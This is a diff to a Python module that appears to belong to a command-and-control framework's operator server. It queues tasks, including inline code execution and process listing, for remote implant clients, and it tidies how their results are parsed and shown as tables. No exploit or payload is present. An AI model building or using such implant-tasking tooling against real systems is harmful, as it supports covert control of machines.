@@ -1,6 +1,7 @@
 import time
 import base64
 import struct
+import tabulate
 
 from lib import logging
 
@@ -50,7 +51,7 @@ def Task_Hello( WebObj, ClientObj, Block, Args ):
                     ##
                     ## Extract information
                     ##
-                    if Obj['return_data']:
+                    if Obj['return_data'] and Obj['return_code'] == 0:
                         Str = base64.b64decode( Obj['return_data'] );
                         Dsk = Str[ 10 : ].decode().split( '\t' )[ 0 ];
                         Ips = Str[ 10 : ].decode().split( '\t' )[ 1 ];
@@ -93,7 +94,6 @@ def Task_ExitFree( WebObj, ClientObj, Block, Args ):
         ##
         Tsk = WebObj.new_task( {
             'code': COMMAND_EXITFREE,
-            'callback': 0,
             'target_id': ClientObj['id'],
             'args': { 'buffer': '{}'.format( base64.b64encode( b'' ).decode() ) }
         } );
@@ -126,7 +126,6 @@ def Task_InlineExecute( WebObj, ClientObj, Block, Args ):
 
         Tsk = WebObj.new_task( {
             'code': COMMAND_INLINE_EXECUTE,
-            'callback': 0,
             'target_id': ClientObj['id'],
             'args': { 'buffer': '{}'.format( base64.b64encode( pkt ).decode() ) }
         } );
@@ -156,12 +155,11 @@ def Task_InlineExecute_ProcessList( WebObj, ClientObj, Block, Args ):
 
         Tsk = WebObj.new_task( {
             'code': COMMAND_INLINE_EXECUTE,
-            'callback': 0,
             'target_id': ClientObj['id'],
             'args': { 'buffer': '{}'.format( base64.b64encode( pkt ).decode() ) }
         } );
 
-        logging.success( 'Tasked to inline-execute processlist' );
+        logging.success( 'Tasked to inline-execute process-list' );
 
         ##
         ##
@@ -185,17 +183,24 @@ def Task_InlineExecute_ProcessList( WebObj, ClientObj, Block, Args ):
                     ##
                     logging.success( 'Task was executed successfully and returned code {}'.format( Obj['return_code'] ) );
 
-                    if Obj['return_data']:
+                    if Obj['return_data'] and Obj['return_code'] == 0:
                         ##
                         ## Create tabulate table and print it.
                         ##
                         Buf = base64.b64decode( Obj['return_data'] );
                         Hdr = [ "Process Name", "PID", "PPID" ]
+                
+                        ##
+                        ## Create a process list
+                        ##
+                        Prc = []
+                        for Line in Buf.split( b'\n' ):
+                            if Line: Prc.append( Line.decode().split( '\t' ) );
 
                         ##
-                        ## Extract each value
+                        ## Print the table
                         ##
-                        print('FUCK ME!');
+                        print( tabulate.tabulate( Prc, headers=Hdr, tablefmt='fancy_grid' ) );
                     else:
                         logging.error( 'No return data was recieved' );
 
